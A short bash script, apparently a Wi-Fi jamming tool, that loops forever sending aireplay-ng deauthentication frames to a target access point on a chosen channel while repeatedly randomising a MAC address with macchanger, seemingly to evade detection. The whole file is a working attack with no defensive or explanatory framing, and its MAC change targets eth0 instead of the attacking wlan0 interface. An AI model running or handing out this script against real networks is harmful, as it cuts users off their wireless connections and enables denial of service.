#!/bin/bash


while true
do
	iwconfig wlan0 channel $1
	aireplay-ng -0 5 -a $2 wlan0
	ifconfig wlan0 down
	macchanger -r eth0 | grep "New MAC"
	ifconfig wlan0 up
	sleep 3
	
done
